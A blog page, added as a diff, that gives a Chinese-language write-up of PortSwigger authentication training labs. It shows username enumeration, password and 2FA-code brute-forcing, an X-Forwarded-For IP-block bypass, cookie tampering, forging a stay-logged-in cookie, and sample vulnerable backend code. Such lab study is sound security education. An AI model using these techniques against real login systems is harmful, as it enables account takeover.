@@ -1,0 +1,790 @@
+
+<!DOCTYPE html><html lang="zh-CN">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.29.1" theme-name="Stellar" theme-version="1.29.1">
+  
+  <meta name="generator" content="Hexo 7.3.0">
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000">
+  <meta name="theme-color" content="#f9fafb">
+  
+  <title>PortSwigger Authentication - sleeper</title>
+
+  
+    <meta name="description" content="AuthenticationLab: Username enumeration via different responses ​            This lab is vulnerable to username enumeration and password  brute-force attacks. It has an account with a predictable user">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PortSwigger Authentication">
+<meta property="og:url" content="http://example.com/2025/10/15/%E9%9D%B6%E5%9C%BA/PortSwigger/Authentication/index.html">
+<meta property="og:site_name" content="sleeper">
+<meta property="og:description" content="AuthenticationLab: Username enumeration via different responses ​            This lab is vulnerable to username enumeration and password  brute-force attacks. It has an account with a predictable user">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pic-bed-1321641074.cos.ap-guangzhou.myqcloud.com/blog/202510201715930.png">
+<meta property="article:published_time" content="2025-10-15T12:37:38.079Z">
+<meta property="article:modified_time" content="2025-10-20T16:54:30.834Z">
+<meta property="article:author" content="she11f">
+<meta property="article:tag" content="PortSwigger">
+<meta property="article:tag" content="Authentication">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic-bed-1321641074.cos.ap-guangzhou.myqcloud.com/blog/202510201715930.png">
+  
+  
+  
+  <meta name="keywords" content="PortSwigger,Authentication">
+
+  <!-- feed -->
+  
+
+  <link rel="stylesheet" href="/css/main.css?v=1.29.1">
+
+  
+    <link rel="shortcut icon" href="https://pic-bed-1321641074.cos.ap-guangzhou.myqcloud.com/image%2Ficon.svg">
+  
+
+  
+
+  <link href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC&display=swap" rel="stylesheet">-<link href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@200&display=swap" rel="stylesheet">
+</head>
+<body>
+
+<div class="l_body s:aa content tech" id="start" layout="post" ><aside class="l_left"><div class="leftbar-container">
+
+
+<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="https://pic-bed-1321641074.cos.ap-guangzhou.myqcloud.com/image/avatar.jpg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main" ff="title">sleeper</div><div class="sub normal cap">自由而全面的发展</div><div class="sub hover cap" style="opacity:0"> Stay hungry，Stay foolish</div></a></div></header>
+
+<div class="nav-area">
+<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="站内搜索"></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>
+
+
+<nav class="menu dis-select"><a class="nav-item" title="博客" href="/" style="color:#1BCDFC"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M5.879 2.879C5 3.757 5 5.172 5 8v8c0 2.828 0 4.243.879 5.121C6.757 22 8.172 22 11 22h2c2.828 0 4.243 0 5.121-.879C19 20.243 19 18.828 19 16V8c0-2.828 0-4.243-.879-5.121C17.243 2 15.828 2 13 2h-2c-2.828 0-4.243 0-5.121.879M8.25 17a.75.75 0 0 1 .75-.75h3a.75.75 0 0 1 0 1.5H9a.75.75 0 0 1-.75-.75M9 12.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5zM8.25 9A.75.75 0 0 1 9 8.25h6a.75.75 0 0 1 0 1.5H9A.75.75 0 0 1 8.25 9" clip-rule="evenodd"/><path fill="currentColor" d="M5.235 4.058C5 4.941 5 6.177 5 8v8c0 1.823 0 3.058.235 3.942L5 19.924c-.975-.096-1.631-.313-2.121-.803C2 18.243 2 16.828 2 14v-4c0-2.829 0-4.243.879-5.121c.49-.49 1.146-.707 2.121-.803zm13.53 15.884C19 19.058 19 17.822 19 16V8c0-1.823 0-3.059-.235-3.942l.235.018c.975.096 1.631.313 2.121.803C22 5.757 22 7.17 22 9.999v4c0 2.83 0 4.243-.879 5.122c-.49.49-1.146.707-2.121.803z" opacity=".5"/></svg></a><a class="nav-item" title="文档" href="/wiki/" style="color:#3DC550"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M14.25 4.48v3.057c0 .111 0 .27.02.406a.936.936 0 0 0 .445.683a.96.96 0 0 0 .783.072c.13-.04.272-.108.378-.159L17 8.005l1.124.534c.106.05.248.119.378.16a.958.958 0 0 0 .783-.073a.936.936 0 0 0 .444-.683c.021-.136.021-.295.021-.406V3.031c.113-.005.224-.01.332-.013C21.154 2.98 22 3.86 22 4.933v11.21c0 1.112-.906 2.01-2.015 2.08c-.97.06-2.108.179-2.985.41c-1.082.286-1.99 1.068-3.373 1.436c-.626.167-1.324.257-1.627.323V5.174c.32-.079 1.382-.203 1.674-.371c.184-.107.377-.216.576-.323m5.478 8.338a.75.75 0 0 1-.546.91l-4 1a.75.75 0 0 1-.364-1.456l4-1a.75.75 0 0 1 .91.546" clip-rule="evenodd"/><path fill="currentColor" d="M18.25 3.151c-.62.073-1.23.18-1.75.336a8.2 8.2 0 0 0-.75.27v3.182l.75-.356l.008-.005a1.13 1.13 0 0 1 .492-.13c.047 0 .094.004.138.01c.175.029.315.1.354.12l.009.005l.749.356V3.647z"/><path fill="currentColor" d="M12 5.214c-.334-.064-1.057-.161-1.718-.339C8.938 4.515 8.05 3.765 7 3.487c-.887-.234-2.041-.352-3.018-.412C2.886 3.007 2 3.9 2 4.998v11.146c0 1.11.906 2.01 2.015 2.079c.97.06 2.108.179 2.985.41c.486.129 1.216.431 1.873.726c1.005.451 2.052.797 3.127 1.034z" opacity=".5"/><path fill="currentColor" d="M4.273 12.818a.75.75 0 0 1 .91-.545l4 1a.75.75 0 1 1-.365 1.455l-4-1a.75.75 0 0 1-.545-.91m.909-4.545a.75.75 0 1 0-.364 1.455l4 1a.75.75 0 0 0 .364-1.455z"/></svg></a><a class="nav-item" title="探索" href="/explore/" style="color:#FA6400"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M20 12a8 8 0 1 1-16 0a8 8 0 0 1 16 0" opacity=".5"/><path fill="currentColor" d="M17.712 5.453c1.047-.193 2.006-.259 2.797-.152c.77.103 1.536.393 1.956 1.064c.446.714.312 1.542-.012 2.258c-.33.728-.918 1.499-1.672 2.268c-1.516 1.547-3.836 3.226-6.597 4.697c-2.763 1.472-5.495 2.484-7.694 2.92c-1.095.217-2.098.299-2.923.201c-.8-.095-1.6-.383-2.032-1.075c-.47-.752-.296-1.63.07-2.379c.375-.768 1.032-1.586 1.872-2.403L4 12.416c0 .219.083.71.168 1.146c.045.23.09.444.123.596c-.652.666-1.098 1.263-1.339 1.756c-.277.567-.208.825-.145.925c.072.116.305.305.937.38c.609.073 1.44.018 2.455-.183c2.02-.4 4.613-1.351 7.28-2.772c2.667-1.42 4.85-3.015 6.23-4.423c.694-.707 1.15-1.334 1.377-1.836c.233-.515.167-.75.107-.844c-.07-.112-.289-.294-.883-.374c-.542-.072-1.272-.041-2.163.112L16.87 5.656c.338-.101.658-.17.842-.203"/></svg></a><a class="nav-item" title="友链" href="/friends/" style="color:#F44336"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="m13.629 20.472l-.542.916c-.483.816-1.69.816-2.174 0l-.542-.916c-.42-.71-.63-1.066-.968-1.262c-.338-.197-.763-.204-1.613-.219c-1.256-.021-2.043-.098-2.703-.372a5 5 0 0 1-2.706-2.706C2 14.995 2 13.83 2 11.5v-1c0-3.273 0-4.91.737-6.112a5 5 0 0 1 1.65-1.651C5.59 2 7.228 2 10.5 2h3c3.273 0 4.91 0 6.113.737a5 5 0 0 1 1.65 1.65C22 5.59 22 7.228 22 10.5v1c0 2.33 0 3.495-.38 4.413a5 5 0 0 1-2.707 2.706c-.66.274-1.447.35-2.703.372c-.85.015-1.275.022-1.613.219c-.338.196-.548.551-.968 1.262" opacity=".5"/><path fill="currentColor" d="M10.99 14.308c-1.327-.978-3.49-2.84-3.49-4.593c0-2.677 2.475-3.677 4.5-1.609c2.025-2.068 4.5-1.068 4.5 1.609c0 1.752-2.163 3.615-3.49 4.593c-.454.335-.681.502-1.01.502c-.329 0-.556-.167-1.01-.502"/></svg></a></nav>
+</div>
+<div class="widgets">
+
+
+<widget class="widget-wrapper post-list"><div class="widget-header dis-select"><span class="name">最近更新</span></div><div class="widget-body fs14"><a class="item title" href="/2025/10/15/%E9%9D%B6%E5%9C%BA/PortSwigger/Authentication/"><span class="title">PortSwigger Authentication</span></a><a class="item title" href="/2025/10/14/%E9%9D%B6%E5%9C%BA/PortSwigger/Information%20Disclosure/"><span class="title">PortSwigger Information Disclosure</span></a><a class="item title" href="/2025/09/08/%E9%9D%B6%E5%9C%BA/PortSwigger/XSS/"><span class="title">PortSwigger XSS</span></a><a class="item title" href="/2025/10/05/%E9%9D%B6%E5%9C%BA/PortSwigger/SQL%20INJECTION/"><span class="title">PortSwigger SQL INJECTION</span></a><a class="item title" href="/2024/09/05/java/%E5%BC%80%E5%8F%91/JavaWeb/"><span class="title">JavaWeb 学习</span></a><a class="item title" href="/2025/03/26/work/%E6%8A%A4%E7%BD%91%E6%80%BB%E7%BB%93/"><span class="title">hvv知识点</span></a><a class="item title" href="/2025/02/13/go/%E5%BC%80%E5%8F%91/%E5%8A%9F%E8%83%BD%E5%BC%80%E5%8F%91/"><span class="title">go 红蓝武器库功能开发</span></a><a class="item title" href="/2025/05/10/%E9%9D%B6%E5%9C%BA/%E7%8E%84%E6%9C%BA/1/"><span class="title">第一章 应急响应-webshell查杀</span></a><a class="item title" href="/2025/03/30/%E9%9D%B6%E5%9C%BA/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/ATT&CK(1)/"><span class="title">红日内网靶场 1</span></a><a class="item title" href="/2024/10/06/go/%E5%BC%80%E5%8F%91/%E5%85%A5%E9%97%A8/"><span class="title">go 入门</span></a></div></widget>
+</div>
+
+</div></aside><div class="l_main" id="main">
+
+
+
+
+
+<div class="article banner top">
+  <div class="content">
+    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
+<span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/PortSwigger/">PortSwigger</a> <span class="sep"></span> <a class="cap breadcrumb-link" href="/categories/PortSwigger/Authentication/">Authentication</a></div>
+<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2025-10-15T12:37:38.079Z">2025-10-15</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2025-10-20T16:54:30.834Z">2025-10-20</time></span></div></div></div>
+    
+    <div class="bottom only-title">
+      
+      <div class="text-area">
+        <h1 class="text title"><span>PortSwigger Authentication</span></h1>
+        
+      </div>
+    </div>
+    
+  </div>
+  </div><article class="md-text content"><h1 id="Authentication"><a href="#Authentication" class="headerlink" title="Authentication"></a>Authentication</h1><h3 id="Lab-Username-enumeration-via-different-responses"><a href="#Lab-Username-enumeration-via-different-responses" class="headerlink" title="Lab: Username enumeration via different responses"></a>Lab: Username enumeration via different responses</h3><blockquote>
+<p>​            This lab is vulnerable to username enumeration and password  brute-force attacks. It has an account with a predictable username and  password, which can be found in the following wordlists:        </p>
+<ul>
+<li>​                <a target="_blank" rel="noopener" href="https://portswigger.net/web-security/authentication/auth-lab-usernames">Candidate usernames</a>            </li>
+<li>​                <a target="_blank" rel="noopener" href="https://portswigger.net/web-security/authentication/auth-lab-passwords">Candidate passwords</a></li>
+</ul>
+<p>​            To solve the lab, enumerate a valid username, brute-force this user’s password, then access their account page.        </p>
+</blockquote>
+<p>info&#x2F;123qwe</p>
+<h3 id="Lab-Username-enumeration-via-subtly-different-responses"><a href="#Lab-Username-enumeration-via-subtly-different-responses" class="headerlink" title="Lab: Username enumeration via subtly different responses"></a>Lab: Username enumeration via subtly different responses</h3><blockquote>
+<p>​			This lab is subtly vulnerable to username enumeration and password  brute-force attacks. It has an account with a predictable username and  password, which can be found in the following wordlists: 	</p>
+<ul>
+<li>​                <a target="_blank" rel="noopener" href="https://portswigger.net/web-security/authentication/auth-lab-usernames">Candidate usernames</a>            </li>
+<li>​                <a target="_blank" rel="noopener" href="https://portswigger.net/web-security/authentication/auth-lab-passwords">Candidate passwords</a></li>
+</ul>
+<p>​			To solve the lab, enumerate a valid username, brute-force this user’s password, then access their account page. </p>
+</blockquote>
+<p>ae&#x2F;jessica</p>
+<h3 id="Lab-Username-enumeration-via-response-timing"><a href="#Lab-Username-enumeration-via-response-timing" class="headerlink" title="Lab: Username enumeration via response timing"></a>Lab: Username enumeration via response timing</h3><blockquote>
+<p>​			This lab is vulnerable to username enumeration using its response  times. To solve the lab, enumerate a valid username, brute-force this  user’s password, then access their account page. 	</p>
+<ul>
+<li>​				Your credentials: <code>wiener:peter</code> 		</li>
+<li>​                <a target="_blank" rel="noopener" href="https://portswigger.net/web-security/authentication/auth-lab-usernames">Candidate usernames</a>            </li>
+<li>​                <a target="_blank" rel="noopener" href="https://portswigger.net/web-security/authentication/auth-lab-passwords">Candidate passwords</a></li>
+</ul>
+</blockquote>
+<ol>
+<li>多次尝试无效登录，IP 将被封锁,但是  <code>X-Forwarded-For</code> 可以绕过，发一次就修改 xff 头</li>
+<li>用户正确的情况下，响应时间会根据您输入的密码长度而增加。</li>
+</ol>
+<p> 				 </p>
+<p>affiliates&#x2F;matthew</p>
+<h3 id="Lab-Broken-brute-force-protection-IP-block"><a href="#Lab-Broken-brute-force-protection-IP-block" class="headerlink" title="Lab: Broken brute-force protection, IP block"></a>Lab: Broken brute-force protection, IP block</h3><blockquote>
+<p>This lab is vulnerable due to a logic flaw in its password brute-force  protection. To solve the lab, brute-force the victim’s password, then  log in and access their account page.        </p>
+<ul>
+<li>​            	Your credentials: <code>wiener:peter</code>        	</li>
+<li>​            	Victim’s username: <code>carlos</code>        	</li>
+<li>​                <a target="_blank" rel="noopener" href="https://portswigger.net/web-security/authentication/auth-lab-passwords">Candidate passwords</a></li>
+</ul>
+</blockquote>
+<p>如果连续 3 次输入错误的登录信息，IP 会被暂时封禁。不过，可以在达到此限制之前登录自己的帐户，重置登录失败次数，gpt 的脚本秒了                     </p>
+<h3 id="Lab-Username-enumeration-via-account-lock"><a href="#Lab-Username-enumeration-via-account-lock" class="headerlink" title="Lab: Username enumeration via account lock"></a>Lab: Username enumeration via account lock</h3><blockquote>
+<p>​             This lab is vulnerable to username enumeration. It uses  account locking, but this contains a logic flaw. To solve the lab,  enumerate a valid username, brute-force this user’s password, then  access their account page.        </p>
+<ul>
+<li>​				<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/authentication/auth-lab-usernames">Candidate usernames</a> 		</li>
+<li>​				<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/authentication/auth-lab-passwords">Candidate passwords</a></li>
+</ul>
+<p> 		</p>
+</blockquote>
+<p>若是存在的账号爆破会又不一样的返回</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=§invalid-username§&amp;password=example§§</span><br></pre></td></tr></table></figure>
+
+<p>这样爆破，第二个位置选择选择 <strong>“Null”payload</strong> 类型，并选择生成5个payload的选项，得到账号后爆破密码，密码也会有不一样的回响，但是被封了一分钟，等一下就能上号了</p>
+<h3 id="Lab-Broken-brute-force-protection-multiple-credentials-per-request"><a href="#Lab-Broken-brute-force-protection-multiple-credentials-per-request" class="headerlink" title="Lab: Broken brute-force protection, multiple credentials per request"></a>Lab: Broken brute-force protection, multiple credentials per request</h3><blockquote>
+<p>​            This lab is vulnerable due to a logic flaw in its  brute-force protection. To solve the lab, brute-force Carlos’s password, then access his account page.        </p>
+<ul>
+<li>​				Victim’s username: <code>carlos</code> 		</li>
+<li>​				<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/authentication/auth-lab-passwords">Candidate passwords</a></li>
+</ul>
+<p> 		</p>
+</blockquote>
+<p>这次是 json 登录，{“username”:”wiener”,”password”:”petwe”}，可以传数组来绕过爆破检查</p>
+<p>将密码的单个字符串值替换为包含所有候选密码的字符串数组。例如：                         </p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;username&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;carlos&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;password&quot;</span> <span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;123456&quot;</span><span class="punctuation">,</span><span class="string">&quot;password&quot;</span><span class="punctuation">,</span><span class="string">&quot;qwerty&quot;</span>... <span class="punctuation">]</span></span><br></pre></td></tr></table></figure>
+
+<p>然后得到 302重定向，右键请求包然后选择 <strong>Show response in browser</strong>，复制 burp 给的链接在浏览器打开就行了</p>
+<h3 id="Lab-2FA-simple-bypass"><a href="#Lab-2FA-simple-bypass" class="headerlink" title="Lab: 2FA simple bypass"></a>Lab: 2FA simple bypass</h3><blockquote>
+<p>​            This lab’s two-factor authentication can be bypassed. You  have already obtained a valid username and password, but do not have  access to the user’s 2FA verification code. To solve the lab, access  Carlos’s account page.        </p>
+<ul>
+<li>​				Your credentials: <code>wiener:peter</code> 		</li>
+<li>​				Victim’s credentials <code>carlos:montoya</code></li>
+</ul>
+<p> 		</p>
+</blockquote>
+<p>这里  wiener  模拟的是我们自己注册的账户，填入账号密码后让我们填验证码，可以点击邮箱客户端看到。但是受害者的第二步验证码卡住了我们，没有看邮箱的选项。</p>
+<p>这个漏洞点在于没有严格校验第二步验证，我们利用自己的账号得知输入完验证码后跳转到 <strong>&#x2F;my-account?id&#x3D;wiener</strong>，尝试登录受害者账号密码后修改路由 <strong>&#x2F;my-account?id&#x3D;carlos</strong>，发现成功登录，绕过了第二步验证码。</p>
+<p>后端代码类似下面</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 问题：在密码校验成功后就把 session 标记为已认证（authenticated = true）。</span></span><br><span class="line"><span class="comment">// 这样即便未完成二次验证（MFA），后端仍把用户当作“已登录”，造成绕过。</span></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/login/step1&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_">checkPassword</span>(req.<span class="property">body</span>.<span class="property">user</span>, req.<span class="property">body</span>.<span class="property">password</span>)) &#123;</span><br><span class="line">    <span class="comment">// 问题点：过早地设置 authenticated 标志</span></span><br><span class="line">    req.<span class="property">session</span>.<span class="property">userId</span> = user.<span class="property">id</span></span><br><span class="line">    req.<span class="property">session</span>.<span class="property">authenticated</span> = <span class="literal">true</span>   <span class="comment">// &lt;-- 太宽泛，会导致 2FA 失效</span></span><br><span class="line">    res.<span class="title function_">redirect</span>(<span class="string">&#x27;/mfa&#x27;</span>)               <span class="comment">// 跳到输入验证码的页面（但 session 已有完整访问权限）</span></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    res.<span class="title function_">status</span>(<span class="number">401</span>).<span class="title function_">send</span>(<span class="string">&#x27;invalid&#x27;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 受保护路由只检查 authenticated</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/account&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (req.<span class="property">session</span> &amp;&amp; req.<span class="property">session</span>.<span class="property">authenticated</span>) &#123;</span><br><span class="line">    <span class="comment">// 即便用户未完成 MFA 也能访问敏感信息</span></span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&#x27;sensitive data&#x27;</span>)</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">send</span>(<span class="string">&#x27;login required&#x27;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="Lab-2FA-broken-logic"><a href="#Lab-2FA-broken-logic" class="headerlink" title="Lab: 2FA broken logic"></a>Lab: 2FA broken logic</h3><blockquote>
+<p>​            This lab’s two-factor authentication is vulnerable due to  its flawed logic. To solve the lab, access Carlos’s account page.        </p>
+<ul>
+<li>​				Your credentials: <code>wiener:peter</code> 		</li>
+<li>​				Victim’s username: <code>carlos</code></li>
+</ul>
+<p> 		</p>
+<p>​			You also have access to the email server to receive your 2FA verification code. 	</p>
+</blockquote>
+<p>首先我们尝试登录自己的账户,输入完账户和密码的返回包</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HTTP/2 302 Found</span><br><span class="line">Location: /login2</span><br><span class="line">Set-Cookie: verify=wiener; HttpOnly</span><br></pre></td></tr></table></figure>
+
+<p>输入验证码的请求包</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /login2 HTTP/2</span><br><span class="line">Cookie: session=RNzTIL0k1fch6CAchZAr3r6COGZFphlF; verify=wiener</span><br><span class="line"></span><br><span class="line">mfa-code=0219</span><br></pre></td></tr></table></figure>
+
+<p>我就猜想，是不是只要把验证码请求包 <strong>verify&#x3D;wiener</strong> 改成 <strong>verify&#x3D;carlos</strong> 就能成功登录了，结果不行，应该是校验了 session，那我又想能不能直接爆破验证码 verify 用受害者的账户</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /login2 HTTP/2</span><br><span class="line">Cookie: session=RNzTIL0k1fch6CAchZAr3r6COGZFphlF; verify=carlos</span><br><span class="line"></span><br><span class="line">mfa-code=$0219$</span><br></pre></td></tr></table></figure>
+
+<p>还是失败，验证邮箱的关键是要先发邮箱，漏了发邮箱的请求包了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /login2 HTTP/2</span><br><span class="line">Cookie: session=R1ReTqffN37lEDAFxjbAnAX3cPKlC10U; verify=wiener</span><br></pre></td></tr></table></figure>
+
+<p>这个请求包控制着第二个阶段验证的邮箱验证码，我们把 verify 改成受害者账户 carlos，先往受害者账户发送验证码，再爆破验证码就能成功登录</p>
+<p><strong>漏洞原因：</strong></p>
+<ul>
+<li>服务端信任了客户端 cookie 的 <code>verify</code> 值；</li>
+<li>验证码查询只校验 <code>username + code</code>，没有绑定到当前 session；</li>
+<li>导致攻击者可以修改 cookie 中的 <code>verify</code> 值为受害者用户名，然后利用验证码爆破或触发受害者发码。</li>
+</ul>
+<h3 id="Lab-2FA-bypass-using-a-brute-force-attack"><a href="#Lab-2FA-bypass-using-a-brute-force-attack" class="headerlink" title="Lab: 2FA bypass using a brute-force attack"></a>Lab: 2FA bypass using a brute-force attack</h3><blockquote>
+<p>​            This lab’s two-factor authentication is vulnerable to  brute-forcing. You have already obtained a valid username and password,  but do not have access to the user’s 2FA verification code. To solve the lab, brute-force the 2FA code and access Carlos’s account page.        </p>
+<p>​            Victim’s credentials: <code>carlos:montoya</code>        </p>
+</blockquote>
+<p>这道题再最后填验证码的时候连续两次输错就会导致 session 实效，就得重新登录账号了，所以不好爆破验证码。不过问题不大，我们可以利用 burp 设置的 sessions 里的的宏功能，再每次请求前都重新登录一遍，刷新session。主要是通过宏操作每次先发三个包</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /login</span><br><span class="line">POST /login</span><br><span class="line">GET /login2</span><br></pre></td></tr></table></figure>
+
+<p>测试宏能看到输入验证码的返回包就行，这样每次爆破前就能自动登录账号密码了，然后就是爆破验证码了，记得把<strong>线程设置为1</strong>，我估计是怕线程太高，宏操作来不及反应还没重新登录就发过去了，因为每次登录都会重置验证码（但是我尝试第二次就成功了，按道理概率没这么大，难道之前的验证码也可以用，还在时效内就行？？？也有可能验证码只与用户账号关联、没有绑定到特定session&#x2F;请求 ID，那么任何在有效期内的码都能被接受，不论它是哪个请求生成的），新的验证码可能是已经尝试了的数字，所以得爆破好几次。得到 302 码在浏览器打开响应包就行了。</p>
+<h3 id="Lab-Brute-forcing-a-stay-logged-in-cookie"><a href="#Lab-Brute-forcing-a-stay-logged-in-cookie" class="headerlink" title="Lab: Brute-forcing a stay-logged-in cookie"></a>Lab: Brute-forcing a stay-logged-in cookie</h3><blockquote>
+<p>​            This lab allows users to stay logged in even after they  close their browser session. The cookie used to provide this  functionality is vulnerable to brute-forcing.        </p>
+<p>​            To solve the lab, brute-force Carlos’s cookie to gain access to his <strong>My account</strong> page.        </p>
+<ul>
+<li>​				Your credentials: <code>wiener:peter</code> 		</li>
+<li>​				Victim’s username: <code>carlos</code> 		</li>
+<li>​				<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/authentication/auth-lab-passwords">Candidate passwords</a></li>
+</ul>
+<p> 		</p>
+</blockquote>
+<p>登录页面多了一个 保持登录功能（Stay logged in ），这个用于持久化登录，但是加密算法被破解了就很容易伪造登录了。我们先登录已知用户的账户，勾选 Stay logged in ，可以看到cookie携带了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: session=SLBvovLWDLI6LrnPnacvK9TEb8aG5MG6; stay-logged-in=d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw</span><br></pre></td></tr></table></figure>
+
+<p>stay-logged-in 破解玩就是 base64(用户名:md5(密码))，那我们就能根据账号爆破了,在intruder 模块那对 payload 进行三次处理</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic-bed-1321641074.cos.ap-guangzhou.myqcloud.com/blog/202510201715930.png" alt="image-20251020171521611"></p>
+<p>爆破的时候要改一下或者删掉session值，爆破成功的话后端会根据 stay-logged-in 给我们返回新的session（因为爆破的时候一开始用的是我们自己账号的session，后端有这个session的记录对不上我们爆破的账户）</p>
+<h3 id="Lab-Offline-password-cracking"><a href="#Lab-Offline-password-cracking" class="headerlink" title="Lab: Offline password cracking"></a>Lab: Offline password cracking</h3><blockquote>
